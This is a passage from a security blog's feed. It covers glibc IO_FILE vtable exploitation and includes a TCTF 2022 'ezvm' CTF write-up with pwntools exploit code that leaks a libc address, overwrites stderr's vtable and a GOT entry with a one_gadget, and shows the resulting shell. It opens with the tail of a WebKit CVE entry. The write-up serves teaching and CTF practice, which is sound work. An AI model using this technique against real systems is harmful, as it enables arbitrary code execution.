B3 IR, and Assembly IR).</li></ul><p>And the patches above were applied to B3ReduceStrength. Strength Reduction is a compiler optimization technique to replace those expensive operations to equivalent but less expensive operations. For example, replace the mul</p><p>[To be continued]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Analyze CVE-2022-32792: Faster Than Light, but at What Cost?&lt;/h1&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Before we jump right into t</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="Writeup" scheme="https://kpwnz.github.io/tags/Writeup/"/>
    
    <category term="JavaScriptCore" scheme="https://kpwnz.github.io/tags/JavaScriptCore/"/>
    
    <category term="WebKit" scheme="https://kpwnz.github.io/tags/WebKit/"/>
    
  </entry>
  
  <entry>
    <title>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</title>
    <link href="https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/"/>
    <id>https://kpwnz.github.io/2022/09/30/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x1/</id>
    <published>2022-09-30T19:44:16.000Z</published>
    <updated>2022-10-03T09:56:17.790Z</updated>
    
    <content type="html"><![CDATA[<h1>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</h1><!-- TOC --><ul><li><a href="#code-execution-by-faking-io_file-vtable-in-glibc-236-0x1">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x1]</a><ul><li><a href="#invalid-vtable">invalid vtable</a></li><li><a href="#tctf-2022-ezvm">TCTF 2022 ezvm</a></li><li><a href="#conclusion">Conclusion</a></li></ul></li></ul><!-- /TOC --><p>In the first part, I showed a new method to completely control the <code>vtable</code> of <code>IO_FILE</code>. In this chapter I would like to present a much more stable way to gain arbitrary code execution and use this way to solve a CTF challenge.</p><h2 id="invalid-vtable">invalid <code>vtable</code></h2><p>In first chapter we focus on bypassing the checking in <code>_IO_vtable_check</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When <code>flag != &amp;_IO_IO_vtable_check</code> and <code>rtld_active() != 0</code>, it will finally invoke <code>_dl_addr()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_dl_addr (<span class="keyword">const</span> <span class="keyword">void</span> *address, Dl_info *info,</span><br><span class="line">  struct link_map **mapp, <span class="keyword">const</span> ElfW(Sym) **symbolp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> addr </span>= DL_LOOKUP_ADDRESS (address);</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">  __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> _dl_find_dso_for_object (addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l)</span><br><span class="line">    &#123;</span><br><span class="line">      determine_info (addr, l, info, mapp, symbolp);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Notice that it will call <code>_dl_find_dso_for_object()</code>. From the assembly code we can find that the address of this function is in <code>ld</code> and it is dynamically resolved which means if we are able to override the <code>.GOT</code> table of it we can jump to anywhere we want! And yes, we don’t need to bruteforce <code>ld</code>’s address with this method.</p><h2 id="TCTF-2022-ezvm">TCTF 2022 ezvm</h2><p>Here I will demonstrate how to use this arbitrary code execution method to solve this CTF challenge. I will focus on code execution part since there are plenty of writeups with different ways of heap grooming and libc leaking I will only briefly cover these parts.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome&#x27;</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code size:&#x27;</span>, <span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;memory count&#x27;</span>, tob(<span class="number">0x100</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code:\n&#x27;</span>, p8(<span class="number">0x17</span>))</span><br></pre></td></tr></table></figure><p>with a simple heap grooming we can have a libc address at <code>memory[0]</code>, then we leak the address bit by bit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">    code =  read_mem(<span class="number">0</span>, <span class="number">0</span>)      <span class="comment"># load memory[0] to register[0]</span></span><br><span class="line">    code += push(<span class="number">0</span>)             <span class="comment"># push register[0]</span></span><br><span class="line">    code += read_imm(<span class="number">1</span>, <span class="number">1</span>&lt;&lt;i)   <span class="comment"># load mask to register[0]</span></span><br><span class="line">    code += push(<span class="number">1</span>)             <span class="comment"># push register[0]</span></span><br><span class="line">    code += stk_and             <span class="comment"># logical and stack[top] stack[top-1] and push the result</span></span><br><span class="line">    code += jmp(<span class="number">1</span>)              <span class="comment"># jump to illegal if 1</span></span><br><span class="line">    code += p8(<span class="number">0xff</span>)+p8(<span class="number">0x17</span>)   <span class="comment"># 0xff(illegal) and exit 0x17</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;code size:\n&#x27;</span>, tob(<span class="built_in">len</span>(code)))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;memory count:&#x27;</span>, tob(<span class="number">0x100</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>, code)</span><br><span class="line">    recv_data = p.recvuntil(<span class="string">b&#x27;finish&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;what&#x27;</span> <span class="keyword">in</span> recv_data:    <span class="comment"># illegal instruction</span></span><br><span class="line">        leak |= (<span class="number">1</span>&lt;&lt;i)</span><br><span class="line">        log.info(<span class="string">&quot;leak data: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><p>Now we have libc address, so that we are able to calculate one gadget from it. Then using the OOB bug and allocate using <code>mmap</code> by setting a size that is big enough.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># allocate memory with mmap, and exploit the OOB bug</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;code size:&#x27;</span>, <span class="string">b&#x27;500&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;memory count&#x27;</span>, tob(<span class="number">0x6000000000200000</span>)) </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;writing to stderr&#x27;</span>)</span><br><span class="line">code =  read_imm(<span class="number">0</span>, libc.address+<span class="number">0xebcf8</span>)     <span class="comment"># one_gadget</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x24340f</span>*<span class="number">8</span>)              <span class="comment"># offset of GOT</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0x41414141</span>)               <span class="comment"># vtable, any value not in vtable segment</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b768</span>)               <span class="comment"># write to stderr-&gt;vtable</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0x1122334455667788</span>)       <span class="comment"># anything</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x15</span>):                      <span class="comment"># override fields in stderr</span></span><br><span class="line">    code += store_mem(<span class="number">0</span>, <span class="number">0x121b698</span>+i*<span class="number">8</span>)</span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b690</span>)               <span class="comment"># stderr-&gt;flag</span></span><br><span class="line">code += read_imm(<span class="number">0</span>, <span class="number">0xaabbccdd55667788</span>)       <span class="comment"># stderr-&gt;write_ptr</span></span><br><span class="line">code += store_mem(<span class="number">0</span>, <span class="number">0x121b6b8</span>)               <span class="comment"># write to stderr-&gt;write_ptr</span></span><br></pre></td></tr></table></figure><p>after that we can notice the <code>vtable</code> is already overrided by <code>AAAA</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/32xg &amp;_IO_2_1_stderr_</span><br><span class="line">0x7fd1d021a6a0 &lt;_IO_2_1_stderr_&gt;:       0x0000000000000000      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6b0 &lt;_IO_2_1_stderr_+16&gt;:    0x1122334455667788      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6c0 &lt;_IO_2_1_stderr_+32&gt;:    0x1122334455667788      0xaabbccdd55667788          </span><br><span class="line">0x7fd1d021a6d0 &lt;_IO_2_1_stderr_+48&gt;:    0x1122334455667788      0x1122334455667788          </span><br><span class="line">0x7fd1d021a6e0 &lt;_IO_2_1_stderr_+64&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a6f0 &lt;_IO_2_1_stderr_+80&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a700 &lt;_IO_2_1_stderr_+96&gt;:    0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a710 &lt;_IO_2_1_stderr_+112&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a720 &lt;_IO_2_1_stderr_+128&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a730 &lt;_IO_2_1_stderr_+144&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a740 &lt;_IO_2_1_stderr_+160&gt;:   0x1122334455667788      0x1122334455667788</span><br><span class="line">0x7fd1d021a750 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fd1d021a760 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fd1d021a770 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x0000000041414141  &lt;- any address here</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and now the <code>.GOT</code> table of <code>_dl_find_dso_for_object</code> is our one gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7f3dbf819088 &lt;_dl_find_dso_for_object@got.plt&gt;:       0x00007f3dbf6ebcf8     0x00007f3dbf7b3430</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/16i 0x00007f3dbf6ebcf8</span><br><span class="line">   0x7f3dbf6ebcf8 &lt;execvpe+1144&gt;:       lea    rdi,[rip+0xec999]        # 0x7f3dbf7d8698                                                                        </span><br><span class="line">   0x7f3dbf6ebcff &lt;execvpe+1151&gt;:       mov    QWORD PTR [rbp-0x78],r9</span><br><span class="line">   0x7f3dbf6ebd03 &lt;execvpe+1155&gt;:       call   0x7f3dbf6eb0f0 &lt;execve&gt;</span><br><span class="line">   0x7f3dbf6ebd08 &lt;execvpe+1160&gt;:       mov    rsp,QWORD PTR [rbp-0x78]</span><br><span class="line">   0x7f3dbf6ebd0c &lt;execvpe+1164&gt;:       mov    eax,DWORD PTR fs:[r14]</span><br><span class="line">   0x7f3dbf6ebd10 &lt;execvpe+1168&gt;:       jmp    0x7f3dbf6ebb82 &lt;execvpe+770&gt;</span><br><span class="line">   0x7f3dbf6ebd15 &lt;execvpe+1173&gt;:       nop    DWORD PTR [rax]</span><br><span class="line">   0x7f3dbf6ebd18 &lt;execvpe+1176&gt;:       mov    BYTE PTR [rbp-0x61],0x1</span><br><span class="line">   0x7f3dbf6ebd1c &lt;execvpe+1180&gt;:       jmp    0x7f3dbf6ebb9d &lt;execvpe+797&gt;</span><br><span class="line">   0x7f3dbf6ebd21 &lt;execvpe+1185&gt;:       mov    DWORD PTR fs:[rcx],0x7</span><br><span class="line">   0x7f3dbf6ebd28 &lt;execvpe+1192&gt;:       mov    rsp,r15</span><br><span class="line">   0x7f3dbf6ebd2b &lt;execvpe+1195&gt;:       jmp    0x7f3dbf6eb8e4 &lt;execvpe+100&gt;</span><br><span class="line">   0x7f3dbf6ebd30 &lt;execvpe+1200&gt;:       lea    rdi,[r10+0x10]</span><br><span class="line">   0x7f3dbf6ebd34 &lt;execvpe+1204&gt;:       lea    rsi,[rbx+0x8]</span><br><span class="line">   0x7f3dbf6ebd38 &lt;execvpe+1208&gt;:       mov    rdx,r11</span><br><span class="line">   0x7f3dbf6ebd3b &lt;execvpe+1211&gt;:       mov    QWORD PTR [rbp-0x80],r9</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>Then trigger IO operation by exiting the program.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿bad)-[~/Desktop/ctf/0ctf/ezvm]</span><br><span class="line">└─$ python3 pwnvm3.py</span><br><span class="line">[*] &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/ezvm_p&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/libc-2.35.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting local process &#x27;/home/kali/Desktop/ctf/0ctf/ezvm/ezvm_p&#x27;: pid 35561</span><br><span class="line">[*] leak data: 0x20</span><br><span class="line">[*] leak data: 0x60</span><br><span class="line">[*] leak data: 0xe0</span><br><span class="line">[*] leak data: 0x4e0</span><br><span class="line">[*] leak data: 0xce0</span><br><span class="line">[*] leak data: 0x1ce0</span><br><span class="line">[*] leak data: 0x9ce0</span><br><span class="line">[*] leak data: 0x19ce0</span><br><span class="line">[*] leak data: 0x819ce0</span><br><span class="line">[*] leak data: 0x1819ce0</span><br><span class="line">[*] leak data: 0x3819ce0</span><br><span class="line">[*] leak data: 0x7819ce0</span><br><span class="line">[*] leak data: 0xf819ce0</span><br><span class="line">[*] leak data: 0x1f819ce0</span><br><span class="line">[*] leak data: 0x3f819ce0</span><br><span class="line">[*] leak data: 0xbf819ce0</span><br><span class="line">[*] leak data: 0x1bf819ce0</span><br><span class="line">[*] leak data: 0x5bf819ce0</span><br><span class="line">[*] leak data: 0xdbf819ce0</span><br><span class="line">[*] leak data: 0x1dbf819ce0</span><br><span class="line">[*] leak data: 0x3dbf819ce0</span><br><span class="line">[*] leak data: 0x13dbf819ce0</span><br><span class="line">[*] leak data: 0x33dbf819ce0</span><br><span class="line">[*] leak data: 0x73dbf819ce0</span><br><span class="line">[*] leak data: 0xf3dbf819ce0</span><br><span class="line">[*] leak data: 0x1f3dbf819ce0</span><br><span class="line">[*] leak data: 0x3f3dbf819ce0</span><br><span class="line">[*] leak data: 0x7f3dbf819ce0</span><br><span class="line">[+] leak: 0x7f3dbf819ce0</span><br><span class="line">[+] libcbase: 0x7f3dbf600000</span><br><span class="line">[*] writing to stderr</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">finish!</span><br><span class="line">continue?</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your code size:</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your memory count:</span><br><span class="line"><span class="meta">$</span><span class="bash"> a</span></span><br><span class="line">Please input your code:</span><br><span class="line">Wrong length!</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> pwn</span></span><br><span class="line">pwn</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Conclusion">Conclusion</h2><p>With this method we can gain arbitrary code execution without constructing any complex structure but only two arbitrary writing and libc address leaking. One of the most obvious drawbacks(in my opinion) is that we almost can’t control any registers which are used to pass arguments, thus we can only jump to one gadget to get shell here.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Code Execution by Faking IO_FILE-&amp;gt;vtable in GLIBC 2.36 [0x1]&lt;/h1&gt;
&lt;!-- TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#code-execution-by-faking-io_file-vt</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</title>
    <link href="https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/"/>
    <id>https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/</id>
    <published>2022-09-27T03:24:42.000Z</published>
    <updated>2022-09-30T05:52:25.497Z</updated>
    
    <content type="html"><![CDATA[<h1>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</h1><p>Since vtables were added to a specific read-only segment in GLIBC and <code>IO_validate_vtable()</code> will verify the <code>vtable</code> of <code>IO_FILE</code> structure, exploitation of <code>IO_FILE-&gt;vtable</code> is becoming much more complex than before. Although we have some great exploitation chains such as House of banana or House of apple, some of them require a series of complex structure construction. So I would like to put forward another way to exploit <code>IO_FILE-&gt;vtable</code> here which can enable the attacker to gain code execution by faking <code>vtable</code> directly.</p><h2 id="vtable-validation">vtable validation</h2><p>When calling the method in <code>vtable</code>, GLIBC will call <code>IO_validate_vtable</code> first</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure><p>when <code>vtable</code> isn’t located in <code>__libc_IO_vtables</code>, it will then invoke <code>IO_vtable_check()</code> to do further validation.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vtable</code> is actually kind of a implementation of polymorphism, so there may be a chance to modify the <code>vtable</code> pointer to perform custom IO operations. In <code>IO_vtable_check()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span 